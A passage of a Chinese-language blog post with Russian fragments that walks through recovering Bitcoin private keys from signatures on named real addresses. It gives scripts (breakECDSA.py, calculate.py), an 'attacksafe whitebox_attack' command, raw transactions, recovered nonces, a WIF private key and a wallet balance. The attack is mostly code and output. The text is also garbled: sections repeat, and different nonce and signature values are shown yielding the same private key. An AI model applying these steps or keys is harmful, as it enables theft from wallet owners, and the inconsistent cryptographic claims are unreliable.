<!-- wp:paragraph -->
<p>現在讓我們通過指定運行腳本<code>&nbsp;секретный ключ "K" (NONCE)</code>：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 point2gen.py 0x39ec5220d3937da589231cbaa5b04002ce3b5689173680ee110ef81287f7867e</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1632} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-39-1024x89.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1632"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>(0xdd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc8 , 0xfc8af5334a2b2742013063d05fcaef03a0c4b4bacabf6a7be849c1db87b5e265)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>EC (secp256k1)&nbsp;</code>檢查具有簽名值的點的坐標<code>R</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0xdd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc8
S = 0x6a2f72ca1d30a0ec392808142960cc4024bb84ce7f2f52288933124004e42103
Z = 0xe3836edb5789a3be19cb8b0c9bc8cb1ae2fd58c30d745ae34ceac35c20c0c21c</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R          =    0xdd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc8
point2gen  =   (0xdd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc8 , 0xfc8af5334a2b2742013063d05fcaef03a0c4b4bacabf6a7be849c1db87b5e265)
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>ВСЕ ВЕРНО!</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0x39ec5220d3937da589231cbaa5b04002ce3b5689173680ee110ef81287f7867e</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>現在知道了密鑰，我們可以得到比特幣錢包的私鑰：<code>12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>讓我們使用&nbsp;<em>Python</em>腳本：&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; 獲取私鑰</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>讓我們打開代碼並添加簽名的所有值<code><strong>K, R, S, Z</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x39ec5220d3937da589231cbaa5b04002ce3b5689173680ee110ef81287f7867e
R = 0xdd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc8
S = 0x6a2f72ca1d30a0ec392808142960cc4024bb84ce7f2f52288933124004e42103
Z = 0xe3836edb5789a3be19cb8b0c9bc8cb1ae2fd58c30d745ae34ceac35c20c0c21c


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>該腳本將使用以下公式計算私鑰：</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>讓我們運行腳​​本：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 calculate.py</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1634} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-40.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1634"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>PrivKey = 028a6a6f6ef174708aac8121c40e8545def4e73d5dd98f8a343f083a49fca03d</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>讓我們打開<strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress</a></strong>並檢查：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ADDR: 12bXHGbbWeqyixHpNjeSmq271ennbLRXh9
WIF:  KwJedezSt21uB3ZoHvzkWbcad4VLaJXu8467Jw58j47s4cseQJrk
HEX:  028a6a6f6ef174708aac8121c40e8545def4e73d5dd98f8a343f083a49fca03d</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1690} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/002-1.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1690"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://www.blockchain.com/btc/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://www.blockchain.com/btc/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code>Приватный ключ найден!</code></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1638,"linkDestination":"custom"} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-42-1024x465.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1638"/><figcaption class="wp-element-caption"><strong><a href="https://www.blockchain.com/btc/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</code></a></strong></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>BALANCE: $ 635.44</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>丟失 BTC 硬幣的潛在威脅在於比特幣區塊鏈交易的嚴重漏洞，因此我們強烈建議大家始終更新軟件並僅使用經過驗證的設備。</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>通過詳細的密碼分析，我們還在同一比特幣地址的<strong><a href="https://btc1.trezor.io/tx/f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6" target="_blank" rel="noreferrer noopener">f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6</a></strong>中發現了一個嚴重漏洞<strong><code>&nbsp;TXID:</code></strong><strong><a href="https://btc1.trezor.io/tx/f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>為攻擊準備 RawTX</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9" target="_blank" rel="noreferrer noopener">12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":1641} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-43-1024x140.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1641"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>RawTX = 0100000001794e79fc042a7644cc4deb6e7858416dd8b898fe418b2894f8d3772ce8d132a0180000006a473044022048771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba502202756e42292c841ccfef832138c52f66f7e03b7f2f86cf3fb4d7fd43d6a526be701210262c3a8791c0e44cd389ebe51c156b5aac490cddef3536638abf8863d55190adbffffffff010c03000000000000232103d68f90ba81455256cb7a0df14fb3930d6df61393207f2f3e71659414d296e0f0ac00000000
</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>現在我們需要從所有易受攻擊的交易中獲取所有的 R、S、Z 值</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>讓我們使用 breakECDSA.py 腳本</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001794e79fc042a7644cc4deb6e7858416dd8b898fe418b2894f8d3772ce8d132a0180000006a473044022048771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba502202756e42292c841ccfef832138c52f66f7e03b7f2f86cf3fb4d7fd43d6a526be701210262c3a8791c0e44cd389ebe51c156b5aac490cddef3536638abf8863d55190adbffffffff010c03000000000000232103d68f90ba81455256cb7a0df14fb3930d6df61393207f2f3e71659414d296e0f0ac00000000
</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1643} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-44-1024x216.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1643"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0x48771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba5
S = 0x2756e42292c841ccfef832138c52f66f7e03b7f2f86cf3fb4d7fd43d6a526be7
Z = 0xa402dc224f712e09602b06c595f272f3e09408f052d8fba3d88609bbbb150139</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>要從易受攻擊的 ECDSA 簽名交易中獲取密鑰，讓我們將數據添加<code>RawTX</code>到文本文檔並將其保存為文件<code>RawTX.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>0100000001794e79fc042a7644cc4deb6e7858416dd8b898fe418b2894f8d3772ce8d132a0180000006a473044022048771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba502202756e42292c841ccfef832138c52f66f7e03b7f2f86cf3fb4d7fd43d6a526be701210262c3a8791c0e44cd389ebe51c156b5aac490cddef3536638abf8863d55190adbffffffff010c03000000000000232103d68f90ba81455256cb7a0df14fb3930d6df61393207f2f3e71659414d296e0f0ac00000000</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><code>-tool whitebox_attack</code>使用軟件啟動<code>“ATTACKSAFE SOFTWARE”</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -tool whitebox_attack -open RawTX.txt -save SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1649} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-47-1024x262.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1649"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>我們發起了這次攻擊<code>-tool whitebox_attack</code>並將結果保存到一個文件中<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>現在看到成功的結果，打開文件<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1647} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-46-1024x374.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1647"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xa402dc224f712e09602b06c595f272f3028a6a6f6ef174708aac8121c40e8545

RawTX = 0100000001794e79fc042a7644cc4deb6e7858416dd8b898fe418b2894f8d3772ce8d132a0180000006a473044022048771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba502202756e42292c841ccfef832138c52f66f7e03b7f2f86cf3fb4d7fd43d6a526be701210262c3a8791c0e44cd389ebe51c156b5aac490cddef3536638abf8863d55190adbffffffff010c03000000000000232103d68f90ba81455256cb7a0df14fb3930d6df61393207f2f3e71659414d296e0f0ac00000000</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>我們看到一個銘文<code>"Deployments ECDSA"</code>，表示比特幣區塊鏈交易中存在嚴重漏洞。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>SecretKey значение в формате HEX, это и есть наш секретный ключ "K" (NONCE):</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0x39ec5220d3937da589231cbaa5b04002ce3b5689173680ee110ef81287f7867e</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>讓我們用<em>Python</em>腳本檢查一下<code>point2gen.py</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>讓我們使用ECPy</strong></a>橢圓曲線庫：</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>現在讓我們通過指定運行腳本<code>&nbsp;секретный ключ "K" (NONCE)</code>：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 point2gen.py 0xa402dc224f712e09602b06c595f272f3028a6a6f6ef174708aac8121c40e8545</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1651} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-48-1024x86.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1651"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>(0x48771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba5 , 0x2c4374cfc4d21df60a3e7592c8ec0ca98640af2adc89276f75d80e65381a36ec)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>EC (secp256k1)&nbsp;</code>檢查具有簽名值的點的坐標<code>R</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0x48771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba5
S = 0x2756e42292c841ccfef832138c52f66f7e03b7f2f86cf3fb4d7fd43d6a526be7
Z = 0xa402dc224f712e09602b06c595f272f3e09408f052d8fba3d88609bbbb150139</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R          =    0x48771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba5
point2gen  =   (0x48771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba5 , 0x2c4374cfc4d21df60a3e7592c8ec0ca98640af2adc89276f75d80e65381a36ec)
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>ВСЕ ВЕРНО!</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0xa402dc224f712e09602b06c595f272f3028a6a6f6ef174708aac8121c40e8545</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>現在知道了密鑰，我們可以得到比特幣錢包的私鑰：<code>12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>讓我們使用&nbsp;<em>Python</em>腳本：&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; 獲取私鑰</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>讓我們打開代碼並添加簽名的所有值<code><strong>K, R, S, Z</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xa402dc224f712e09602b06c595f272f3028a6a6f6ef174708aac8121c40e8545
R = 0x48771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba5
S = 0x2756e42292c841ccfef832138c52f66f7e03b7f2f86cf3fb4d7fd43d6a526be7
Z = 0xa402dc224f712e09602b06c595f272f3e09408f052d8fba3d88609bbbb150139


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>該腳本將使用以下公式計算私鑰：</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>讓我們運行腳​​本：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 calculate.py</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1653} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-49.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1653"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>PrivKey = 028a6a6f6ef174708aac8121c40e8545def4e73d5dd98f8a343f083a49fca03d</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>讓我們打開<strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress</a></strong>並檢查：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ADDR: 12bXHGbbWeqyixHpNjeSmq271ennbLRXh9
WIF:  KwJedezSt21uB3ZoHvzkWbcad4VLaJXu8467Jw58j47s4cseQJrk
HEX:  028a6a6f6ef174708aac8121c40e8545def4e73d5dd98f8a343f083a49fca03d</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1691} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/002-2.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1691"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://www.blockchain.com/btc/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://www.blockchain.com/btc/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code>Приватный ключ найден!</code></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1655,"linkDestination":"custom"} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/002-addr.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1655"/><figcaption class="wp-element-caption"><strong><a href="https://www.blockchain.com/btc/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</code></a></strong></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>BALANCE: $ 635.44</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><code>№3</code></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>通過詳細的密碼分析，我們還發現了比特幣地址中的一個嚴重漏洞：</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz" target="_blank" rel="noreferrer noopener">15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/c8bbc3b05bc3a560ed5f4655c73cccf5cf6ff09b62279691df06ad8a121c9859"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/c8bbc3b05bc3a560ed5f4655c73cccf5cf6ff09b62279691df06ad8a121c9859
</div></figure>
<!-- /wp:embed -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":1531} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-4-1024x201.png" alt="白盒攻擊" class="wp-image-1531"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":1533} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-5-1024x200.png" alt="白盒攻擊" class="wp-image-1533"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>為攻擊準備 RawTX</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz" target="_blank" rel="noreferrer noopener">15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/c8bbc3b05bc3a560ed5f4655c73cccf5cf6ff09b62279691df06ad8a121c9859"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/c8bbc3b05bc3a560ed5f4655c73cccf5cf6ff09b62279691df06ad8a121c9859
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":1656} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-50-1024x142.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1656"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>RawTX = 01000000015c55f614688adf76c9186a89af07d4aca2aba8d612d6b445e8bd500bef21dac62b0000006a47304402207f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d0220712f483ef5f8b98166fa673c6a8eb8379249cb1a3a7842d1d877096fca773677012102506c7593c4e301c2729dbfc46b2959c7a92f6f20c672b6d0feff9c5b6a567cf9ffffffff01c6020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>現在我們需要從所有易受攻擊的交易中獲取所有的 R、S、Z 值</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>讓我們使用 breakECDSA.py 腳本</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python2 breakECDSA.py 01000000015c55f614688adf76c9186a89af07d4aca2aba8d612d6b445e8bd500bef21dac62b0000006a47304402207f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d0220712f483ef5f8b98166fa673c6a8eb8379249cb1a3a7842d1d877096fca773677012102506c7593c4e301c2729dbfc46b2959c7a92f6f20c672b6d0feff9c5b6a567cf9ffffffff01c6020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1658} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-51-1024x213.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1658"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0x7f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d
S = 0x712f483ef5f8b98166fa673c6a8eb8379249cb1a3a7842d1d877096fca773677
Z = 0x2a3395f1143929b17c0dd24f89fc6eceee3d099c2286b7d1f147886ca30e5a7d</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>要從易受攻擊的 ECDSA 簽名交易中獲取密鑰，讓我們將數據添加<code>RawTX</code>到文本文檔並將其保存為文件<code>RawTX.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>01000000015c55f614688adf76c9186a89af07d4aca2aba8d612d6b445e8bd500bef21dac62b0000006a47304402207f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d0220712f483ef5f8b98166fa673c6a8eb8379249cb1a3a7842d1d877096fca773677012102506c7593c4e301c2729dbfc46b2959c7a92f6f20c672b6d0feff9c5b6a567cf9ffffffff01c6020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><code>-tool whitebox_attack</code>使用軟件啟動<code>“ATTACKSAFE SOFTWARE”</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -tool whitebox_attack -open RawTX.txt -save SecretKey.txt</code></pre>
<!-- /wp:code -->
